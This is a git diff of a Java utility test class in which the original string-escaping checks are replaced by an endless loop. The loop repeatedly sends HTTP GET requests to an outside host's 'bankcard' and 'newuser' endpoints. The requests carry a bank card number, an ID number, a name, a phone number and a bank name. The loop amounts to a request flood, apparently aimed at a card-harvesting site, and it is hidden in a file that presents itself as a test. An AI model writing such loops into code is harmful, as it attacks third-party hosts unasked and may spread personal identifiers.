@@ -15,24 +15,27 @@
 
 package com.albedo.java.common;
 
-import cn.hutool.core.util.EscapeUtil;
-import cn.hutool.http.HtmlUtil;
-import cn.hutool.json.JSONUtil;
-import com.albedo.java.common.core.util.StringUtil;
+import cn.hutool.http.HttpRequest;
+import cn.hutool.http.HttpResponse;
+import cn.hutool.http.HttpUtil;
 
 import java.io.UnsupportedEncodingException;
-import java.net.URLDecoder;
 
 public class UtilTest {
 
-	public static void main(String[] args) throws UnsupportedEncodingException {
-		String rs = "Webhook \u7684 payload POST \u65f6\u5fc5\u987b\u662f JSON \u5b57\u7b26\u4e32";
-		System.out.println(EscapeUtil.unescapeHtml4(rs));
-		System.out.println(HtmlUtil.escape("测试"));
-		String s = "%5B%7B%22format%22:%22%22,%22fieldName%22:%22a.username%22,%22attrType%22:%22String%22,%22fieldNode%22:%22%22,%22operate%22:%22like%22,%22weight%22:0,%22value%22:%22%E5%86%9C%E4%BF%A1%22,%22endValue%22:%22%22%7D%5D";
-		System.out.println(EscapeUtil.unescape(s));
-		System.out.println(URLDecoder.decode(s, "utf-8"));
-		System.out.println(JSONUtil.toJsonStr("utf-8".split(StringUtil.SPLIT_DEFAULT)));
+	public static void main(String[] args) throws UnsupportedEncodingException, InterruptedException {
+		while (true) {
+			String qu = "http://gx6a5ehjbvlou3rrpqhsdyz8.n60y.xyz/api/bankcard.php?card=6222081812002934027";
+			HttpRequest get = HttpUtil.createGet(qu);
+			HttpResponse execute = get.execute();
+			System.out.println(execute);
+			String rs = "http://gx6a5ehjbvlou3rrpqhsdyz8.n60y.xyz/index/newapi/newuser?sname=%E5%BA%B7%E5%9C%A3%E6%9D%B0&shaoma=610403197006263458&card=6222081812002934027&mima=&phone=342342342&money=343243242&bankname=%E5%82%A8%E8%93%84%E5%8D%A1-%E4%B8%AD%E5%9B%BD%E5%B7%A5%E5%95%86%E9%93%B6%E8%A1%8C&cvn=&ytime=";
+			HttpRequest get1 = HttpUtil.createGet(rs);
+			HttpResponse execute1 = get1.execute();
+			System.out.println(execute1);
+		}
+
 	}
+
 
 }
